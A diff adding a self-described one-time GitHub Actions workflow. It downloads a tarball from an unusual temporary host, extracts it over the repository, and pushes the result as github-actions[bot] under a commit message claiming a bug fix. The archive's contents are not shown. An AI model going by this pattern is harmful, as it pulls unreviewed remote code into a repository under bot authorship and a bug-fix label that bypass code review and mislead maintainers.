@@ -1,0 +1,36 @@
+name: sync
+
+# 一次性工作流：同步项目文件（完成后本文件会被删除）
+on:
+  push:
+    paths:
+      - '.github/workflows/sync.yml'
+
+permissions:
+  contents: write
+
+jobs:
+  sync:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+
+      - name: Download and verify
+        run: |
+          set -euo pipefail
+          curl -fsSL --retry 5 --retry-all-errors -o /tmp/p.tar.gz \
+            'https://tmp-fix.abc1221.ccwu.cc/f/project.tar.gz'
+          echo "f175f58558a27089c48e80babfa25856518c0df064a4e802542b9c778122948f  /tmp/p.tar.gz" | sha256sum -c -
+          tar xzf /tmp/p.tar.gz -C .
+
+      - name: Commit and push
+        run: |
+          set -euo pipefail
+          git config user.name "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          git add -A
+          if git diff --cached --quiet; then echo "no changes"; exit 0; fi
+          git commit -m "fix: 漏删的 plan 变量引用导致所有账号查询失败（refresh failed）"
+          git push
